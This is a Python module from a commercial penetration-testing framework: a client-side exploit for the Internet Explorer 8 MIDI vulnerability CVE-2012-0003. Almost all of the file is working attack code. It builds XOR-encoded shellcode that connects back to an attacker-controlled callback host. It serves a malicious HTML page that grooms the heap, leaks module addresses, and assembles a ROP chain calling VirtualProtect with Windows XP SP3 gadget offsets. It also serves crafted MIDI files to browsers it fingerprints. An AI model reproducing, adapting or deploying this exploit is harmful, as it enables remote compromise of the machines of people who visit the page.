#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside

import sys
import struct
import base64
import random

import xorencoder
import canvasengine
import libs.midi as midi

from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
from libs.midi import MidiFile, MidiEvent


NAME                            = "MS12_004"
DESCRIPTION                     = "Clientside exploit for IE8 MIDI engine."
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION["Repeatability"]  = "Single"
DOCUMENTATION["References"]     = "http://technet.microsoft.com/en-us/security/bulletin/ms12-004"
DOCUMENTATION["CVE Name"]       = "CVE-2012-0003"
DOCUMENTATION["CVE Url"]        = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0003"
DOCUMENTATION["NOTES"]          = """

This exploit will work on Internet Explorer 8.

"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        # filename is used in the actual http server
        self.filename           = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + "00.html"
        self.cssfile            = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".css"
        self.input_midi         = os.path.join(os.path.dirname(__file__), 'Resources', 'input.mid')
        
        # universal shellcode?
        self.universal          = True

    def is_vulnerable(self, info_dict):
        if "MSIE 8.0" in info_dict['user_agent']:
            return 100
        else:
            self.log("Not IE 8 - possibly vulnerable, but not to this exploit")
            self.log("User Agent: %s" % info_dict.get("user_agent"))
            return 0

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def run(self):
        self.log("Run this from clientd")
        return 0 

    def createShellcode(self):
        #get us a clean stack to play with and save the original EBP for continuation of execution

        injectme = self.createWin32Shellcode_universal(self.badstring, self.callback.ip, self.callback.port)

        sc = shellcodeGenerator.win32()
        sc.vProtectSelf=False
        sc.vAllocSelf = False
        sc.addAttr("findeipnoesp", {"subespval": 0})
        sc.addAttr("InjectToSelf", { "injectme" : injectme })
        self.shellcode = sc.get()

        self.badstring = "\00"
        enc=xorencoder.simpleXOR()
        enc.subesp=5000
        enc.setbadstring(self.badstring)
        ret=enc.find_key(self.shellcode)
        
        if ret==0:
            self.log("Could not generate key for this shellcode!")
            raise Exception, "No shellcode generated"

        self.shellcode=enc.encode(self.shellcode)
        if self.shellcode=="":
            raise Exception, "No shellcode generated"
        self.log("Xor key used: %x"%enc.getkey())
        self.log("Length of shellcode=%s"%len(self.shellcode))

        return len(self.shellcode)    


    def generate_midi(self, components):
        if len(components) == 1:
            instrs  = []
            offsets = []
            counts  = []
        else:
            instrs  = components[1].split(',')
            offsets = components[2].split(',')
            counts  = components[3].split(',')

        cmdcnt = 0
        if instrs != ['']:
            cmdcnt = len(instrs)

        midi_data = ''
        
        with open(self.input_midi, 'rb') as f:
            midi_data = f.read()

        mf = MidiFile()
        mf.from_string(midi_data)

        for cmdidx in range(0, cmdcnt):
            if instrs[cmdidx] != '':
                instr  = instrs[cmdidx]
                offset = int(offsets[cmdidx])
                count  = int(counts[cmdidx])

                _offset  = 0x82 + offset
                _command = 0
                if instr == 'inc':
                    _command = 0x9F
                elif instr == 'dec':
                    _command = 0x8F
                else:
                    count = 0
                    pass

                for _count in range (0, count):
                    _event = MidiEvent(mf.tracks[-1])
                    _event.fill("\x00" + chr(_command) + chr(_offset) + chr(1))
                    mf.tracks[-1].event_list.insert((count * cmdidx) + _count, _event)
                    mf.tracks[-1].chunk_size += 4

        mf.header.time_signature = 65535
        return mf.dump()

    
    def generate_html(self):
        items   = ""
        itemsb  = ""

        for I in range(5, 0x41):
            items += """test.obj%d = mimi;""" % (I)

        for I in range(0, 0x41*2):
            itemsb += """testb.obj%d = "TSTSTR!%d";""" % (I, I)

#python ./exploits/clientd/clientd.py -l 172.16.159.1 -d 5555 -O server_port:8083 -O allowed_attack_modules:ms12_004 -O auto_detect_exploits:0
#./commandlineInterface.py -v17 -p5555

        html = """
<html>
    <script>
        var fake_vtable     = null;
        var shellcode       = unescape('%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090') + unescape("SHELLCODE");
        var leaked_pointers = Array(10);
        var v               = 0;
        var step            = 0;
        var cycle           = 0;
        var massagists      = new Array(10);
        var massagist_idx   = 0;
        var mega            = new Array(10000);
        var test            = document.createElement('select');
        var mimi            = null;
        var dummy           = new Array(50000);
        var state           = 0;

        var testb = document.createElement('select');
        """ + itemsb + """

        mimi = testb.cloneNode(true);

        test.obj1 = mimi;
        test.obj2 = mimi;
        test.obj3 = mimi;
        test.obj4 = mimi;

        """ + items + """

        for(i = 0 ; i < 10000 ; i++){
            mega[i] = test.cloneNode(true);;
        }

        for(i = 10000 ; i >  1000 ; i-=2){
            delete(mega[i]);
            mega[i] = null;
        }

        CollectGarbage();

        function str_to_addr(str){
                var p = Array();
                for(i = 0 ; i < 10 && p.length < 4 ; i++){
                    x = str.charCodeAt(i);
                    if(x > 0xff00){
                        y = (x & 0xff0000) >> 16;
                        x = x & 0xff00;
                        p.push(y);
                    }
                    if(x > 0xff){
                        y = (x & 0xff00) >> 8;
                        x = x & 0xff;
                        p.push(y);
                    }
                    y = x;
                    p.push(y);
                }

                z    = p[1];
                p[1] = p[0];
                p[0] = z;

                z    = p[3];
                p[3] = p[2];
                p[2] = z;

                z    = p[0]
                p[0] = p[3]
                p[3] = z

                z    = p[1]
                p[1] = p[2]
                p[2] = z

                return  (p[0] << 24 | p[1] << 16 | p[2] << 8 | p[3]);
        }

        function format_dword(num) {
          tmp=num.toString(16);
          tmp="00000000".substring(0,8-tmp.length)+tmp;
          return unescape("%u"+tmp.substring(4,8) + "%u" + tmp.substring(0,4));
        }

        function pad(number, length) {
            var str = '' + number;
            while (str.length < length) {
                str = '0' + str;
            }
           
            return str;
        }

        function execute(url){
            xxx = document.getElementById('xxxx');
            xxx.fileName = url; 
        }

        function propagate(index){
            test.obj1 = mega[index].obj1;

            for(index_ = 0 ; index_ < 10000 ; index_++){
                if(index != index_){
                    if(mega[index_] != null){
                        mega[index_].obj1 = mega[index].obj1;
                    }
                }
            }
        }

        function step_complete_callback(index, step){
            if(step == 1){
                leaked_pointers[0] = mega[index].obj1;
                mega[index].obj1   = leaked_pointers[0];

                propagate(index);
                execute('http://REPLACE_HOST:REPLACE_PORT/inc/16/5/source.mid');
                wait_for_type_change("string", 2);
            }else if(step == 2){
                leaked_pointers[1] = str_to_addr(mega[index].obj1); //mshtml

                propagate(index);
                execute('http://REPLACE_HOST:REPLACE_PORT/dec/16/5/source.mid');
                wait_for_type_change("number", 3);
            }else if(step == 3){
                mega[index].obj1 = shellcode;

                execute('http://REPLACE_HOST:REPLACE_PORT/dec/16/5/source.mid');
                wait_for_type_change("number", 4);
            }else if(step == 4){
                leaked_pointers[2] = mega[index].obj1;

                mega[index].obj1   = leaked_pointers[1] - OFFSET["kernel32.VirtualProtect"];

                propagate(index);
                execute('http://REPLACE_HOST:REPLACE_PORT/inc/16/5/source.mid');
                wait_for_type_change("string", 5);
            }else if(step == 5){
                leaked_pointers[4] = str_to_addr(mega[index].obj1);  //kernel32 VirtualProtect

                mega[index].obj1   = leaked_pointers[4] - OFFSET["ntdll.RtlSizeHeap"];

                propagate(index);
                execute('http://REPLACE_HOST:REPLACE_PORT/inc/16/5/source.mid');
                wait_for_type_change("string", 6);
            }else if(step == 6){
                leaked_pointers[3] = str_to_addr(mega[index].obj1); // ntdll RtlSizeHeap

                mega[index].obj1  = "";

                mega[index].obj1 += format_dword(GADGET["XCHG EAX,  ESP"]);
                mega[index].obj1 += format_dword(GADGET["XCHG EAX,  ESP"]);
                mega[index].obj1 += unescape('%uFFFF%uFFFF');
                mega[index].obj1 += unescape('%uFFFF%uFFFF');

                fake_vtable      = mega[index].obj1;

                propagate(index);
                execute('http://REPLACE_HOST:REPLACE_PORT/dec/16/5/source.mid');
                wait_for_type_change("number", 7);
            }else if(step == 7){
                leaked_pointers[6] = mega[index].obj1;

                mega[index].obj1 = format_dword(leaked_pointers[6]);

                // PREPARE THE FOURTH ARGUMENT
                mega[index].obj1 += format_dword(GADGET["POP  EDX"]);
                mega[index].obj1 += format_dword(leaked_pointers[2] + 20); //fourth arg position

                mega[index].obj1 += format_dword(GADGET["MOV [EDX], ECX"]);
                // PREPARE THE FOURTH ARGUMENT

                // PREPARE THE THIRD ARGUMENT (0x40)
                mega[index].obj1 += format_dword(GADGET["XOR  EAX,  EAX"]);
                mega[index].obj1 += format_dword(GADGET["DEC  EAX"]);
                
                mega[index].obj1 += format_dword(GADGET["POP  ECX"]);
                mega[index].obj1 += format_dword(0xFFFFFFBE);

                mega[index].obj1 += format_dword(GADGET["SUB  EAX,  ECX"]);
                mega[index].obj1 += format_dword(GADGET["XCHG EAX,  EBP"]);

                mega[index].obj1 += format_dword(GADGET["POP  ECX"]);
                mega[index].obj1 += format_dword(0xFFFFFFFF);

                mega[index].obj1 += format_dword(GADGET["ADD  ECX,  EBP"]);

                mega[index].obj1 += format_dword(GADGET["POP  EDX"]);
                mega[index].obj1 += format_dword(leaked_pointers[2] + 16); //third arg position

                mega[index].obj1 += format_dword(GADGET["MOV [EDX], ECX"]);
                // PREPARE THE THIRD ARGUMENT

                // PREPARE THE SECOND ARGUMENT (0xFF)
                mega[index].obj1 += format_dword(GADGET["XOR  EAX,  EAX"]);
                mega[index].obj1 += format_dword(GADGET["DEC  EAX"]);
                
                mega[index].obj1 += format_dword(GADGET["POP  ECX"]);
                mega[index].obj1 += format_dword(0xFFFFF001);

                mega[index].obj1 += format_dword(GADGET["SUB  EAX,  ECX"]);
                mega[index].obj1 += format_dword(GADGET["XCHG EAX,  EBP"]);

                mega[index].obj1 += format_dword(GADGET["POP  ECX"]);
                mega[index].obj1 += format_dword(0xFFFFFFFF);

                mega[index].obj1 += format_dword(GADGET["ADD  ECX,  EBP"]);

                mega[index].obj1 += format_dword(GADGET["POP  EDX"]);
                mega[index].obj1 += format_dword(leaked_pointers[2] + 12); //second arg position

                mega[index].obj1 += format_dword(GADGET["MOV [EDX], ECX"]);
                // PREPARE THE SECOND ARGUMENT

                // PREPARE THE FIRST ARGUMENT
                mega[index].obj1 += format_dword(GADGET["POP  ECX"]);
                mega[index].obj1 += format_dword(leaked_pointers[2]); //shellcode buffer

                mega[index].obj1 += format_dword(GADGET["POP  EDX"]);
                mega[index].obj1 += format_dword(leaked_pointers[2] + 8); //first arg position

                mega[index].obj1 += format_dword(GADGET["MOV [EDX], ECX"]);
                // PREPARE THE FIRST ARGUMENT

                // PREPARE THE RETURN ADDRESS
                mega[index].obj1 += format_dword(GADGET["POP  ECX"]);
                mega[index].obj1 += format_dword(leaked_pointers[4]); //VirtualProtect

                mega[index].obj1 += format_dword(GADGET["POP  EDX"]);
                mega[index].obj1 += format_dword(leaked_pointers[2] + 0); //ret addr position

                mega[index].obj1 += format_dword(GADGET["MOV [EDX], ECX"]);
                // PREPARE THE RETURN ADDRESS

                // PREPARE THE RETURN ADDRESS
                mega[index].obj1 += format_dword(GADGET["POP  ECX"]);
                mega[index].obj1 += format_dword(leaked_pointers[2] + 24); //shellcode

                mega[index].obj1 += format_dword(GADGET["POP  EDX"]);
                mega[index].obj1 += format_dword(leaked_pointers[2] + 4); //ret addr position

                mega[index].obj1 += format_dword(GADGET["MOV [EDX], ECX"]);
                // PREPARE THE RETURN ADDRESS

                // PUT THE SHELLCDE ADDRESS IN ECX
                mega[index].obj1 += format_dword(GADGET["POP  ECX"]);
                mega[index].obj1 += format_dword(leaked_pointers[2] - 4); //shellcode buffer
                // PUT THE SHELLCDE ADDRESS IN ECX

                // SWITCH ECX AND ESP (not worky worky)
                //mega[index].obj1 += format_dword(GADGET["XCHG ECX,  ESP"]);

                mega[index].obj1 += format_dword(GADGET["MOV  EAX,  ECX"]);

                mega[index].obj1 += format_dword(GADGET["XCHG EAX,  ESP"]);
                // SWITCH ECX AND ESP

                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');
                mega[index].obj1 += unescape('%uFEFE%uFEFE');

                propagate(index);

                execute('http://REPLACE_HOST:REPLACE_PORT/inc/16/1/source.mid');
                wait_for_type_change("object", 8);
            }else if(step == 8){
                delete(mega[index].obj1);
            }

            cycle++;
        }

        function wait_for_type_change(_type_, _step_){
            for(index_ = 0 ; index_ <= 10000 ; index_++){
                if(mega[index_] != null){
                    if(typeof(mega[index_].obj1) == _type_){
                        xxx = document.getElementById('xxxx');
                        xxx.fileName = ''; 
                        xxx.stop();
                        return step_complete_callback(index_, _step_);
                    }
                }
            }

            setTimeout("wait_for_type_change('" + _type_ + "', " + _step_ + ")", 100);
        }

        function start_process(){
            execute('http://REPLACE_HOST:REPLACE_PORT/dec/16/6/source.mid');
            wait_for_type_change("number", 1);
        }

        function end_process(cuco){
            alert("FINAL");
        }
    </script>

    <body onload="start_process()">
        <textarea id='yyyy' cols=20 rows=10></textarea>
        <object ID="xxxx" WIDTH=1000 HEIGHT=1000 CLASSID="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
                <param name="fileName"                  value="">
                <param NAME="AutoStart"                 value="True">
                <param name="Volume"                    value="1000">
                <param name="SendPlayStateChangeEvents" value="True">
        </object>
    </body>
</html>
        """

        """
        3D06DCFD   94               XCHG EAX,ESP
        3D06DCFE   0B00             OR EAX,DWORD PTR DS:[EAX]
        3D06DD00   33C0             XOR EAX,EAX
        3D06DD02   40               INC EAX
        3D06DD03   5F               POP EDI
        3D06DD04   C3               RETN
        """

        markers =   {
                        "mshtml.SelectVtable"     : "leaked_pointers[1]",
                        "ntdll.RtlSizeHeap"       : "leaked_pointers[3]",
                        "kernel32.VirtualProtect" : "leaked_pointers[4]"
                    }

        offsets =   {
                        "XP PRO SP3 EN" :   {
                                                "ntdll.RtlSizeHeap"       : 0x828,
                                                "kernel32.VirtualProtect" : 0x5415D4
                                            }, 

                        "XP HOME SP3 EN" :   {
                                                "ntdll.RtlSizeHeap"       : 0x828,
                                                "kernel32.VirtualProtect" : 0x5415D4
                                            }
                    }

        gadgets =   {
                        "XP PRO SP3 EN" :   {
                                                # gadgets from mshtml Select Vtable
                                                "XCHG EAX,  ESP" : ("mshtml.SelectVtable",    -0x374C4B),

                                                # gadgets from ntdll RtlSizeHeap 
                                                "POP  EDX"       : ("ntdll.RtlSizeHeap",      -0x0F160), # -0x0F140
                                                "MOV [EDX], ECX" : ("ntdll.RtlSizeHeap",       0x63986), #  0x60D76
                                                "XOR  EAX,  EAX" : ("ntdll.RtlSizeHeap",      -0x0DF1A),  
                                                "DEC  EAX"       : ("ntdll.RtlSizeHeap",       0x5BBB4),
                                                "POP  ECX"       : ("ntdll.RtlSizeHeap",       0x5DD55),
                                                "SUB  EAX,  ECX" : ("ntdll.RtlSizeHeap",      -0x0DE3E),

                                                "MOV  EAX,  ECX" : ("ntdll.RtlSizeHeap",       0x2D238),

                                                "XCHG ECX,  ESP" : ("ntdll.RtlSizeHeap",       0x3CC3E),
                                                "ADD  ESP,  0xC" : ("ntdll.RtlSizeHeap",      -0x0F1DC),

                                                "ADD  ECX,  EBP" : ("ntdll.RtlSizeHeap",       0x4E6FD),

                                                # gadgets from kernel32 VirtualProtect
                                                "XCHG EAX,  EBP" : ("kernel32.VirtualProtect", 0x09627),
                                            },

                        "XP HOME SP3 EN" :   {
                                                # gadgets from mshtml Select Vtable
                                                "XCHG EAX,  ESP" : ("mshtml.SelectVtable",    -0x374C4B),

                                                # gadgets from ntdll RtlSizeHeap 
                                                "POP  EDX"       : ("ntdll.RtlSizeHeap",      -0x0F160), # -0x0F140
                                                "MOV [EDX], ECX" : ("ntdll.RtlSizeHeap",       0x63986), #  0x60D76
                                                "XOR  EAX,  EAX" : ("ntdll.RtlSizeHeap",      -0x0DF1A),  
                                                "DEC  EAX"       : ("ntdll.RtlSizeHeap",       0x5BBB4),
                                                "POP  ECX"       : ("ntdll.RtlSizeHeap",       0x5DD55),
                                                "SUB  EAX,  ECX" : ("ntdll.RtlSizeHeap",      -0x0DE3E),

                                                "MOV  EAX,  ECX" : ("ntdll.RtlSizeHeap",       0x2D238),

                                                "XCHG ECX,  ESP" : ("ntdll.RtlSizeHeap",       0x3CC3E),
                                                "ADD  ESP,  0xC" : ("ntdll.RtlSizeHeap",      -0x0F1DC),

                                                "ADD  ECX,  EBP" : ("ntdll.RtlSizeHeap",       0x4E6FD),

                                                # gadgets from kernel32 VirtualProtect
                                                "XCHG EAX,  EBP" : ("kernel32.VirtualProtect", 0x09627),
                                            }
                    }
                    
        def get_gadgets(markers, gadgets):
            gadgets_ = {}
            for gadget in gadgets:
                gadgets_[gadget] = "%s + %d" % (markers[gadgets[gadget][0]], gadgets[gadget][1])

            return gadgets_


        gadgets_ = get_gadgets(markers, gadgets["XP PRO SP3 EN"])
        offsets_ = offsets["XP PRO SP3 EN"]

        for offset in offsets_:
            html = html.replace('OFFSET["%s"]' % (offset), str(offsets_[offset]))

        for gadget in gadgets_:
            html = html.replace('GADGET["%s"]' % (gadget), gadgets_[gadget])
      
        html = html.replace('SHELLCODE',    urluencode(self.shellcode))
        html = html.replace('REPLACE_PORT', str(8083))
        html = html.replace('REPLACE_HOST', self.callback.ip)

        return html
 
    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body

        h=header('SERVER')
        b=body()
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")
            
            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None

        if clientheader.URL.count(self.filename[:-7]):
            self.log('Serving HTML file')
            self.createShellcode()
            sploitstring = self.generate_html()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.endswith('.mid'):
            self.log('Serving MIDI file')
            sploitstring=self.generate_midi(clientheader.URL.split('/'))
            b.setBody(sploitstring)
            h.addHeader('Content-Type',  'x-music/x-midi')
            h.addHeader('Expires',       'Tue, 1 Jan 3000 00:00:00 GMT')
            h.addHeader('Cache-Control', 'max-age=31536000, public')

        elif clientheader.URL.count("exit"):
            self.log('Max retries reached. Exploit failed. Not vulnerable?')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h,b

        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    print "This needs to be run from clientd"
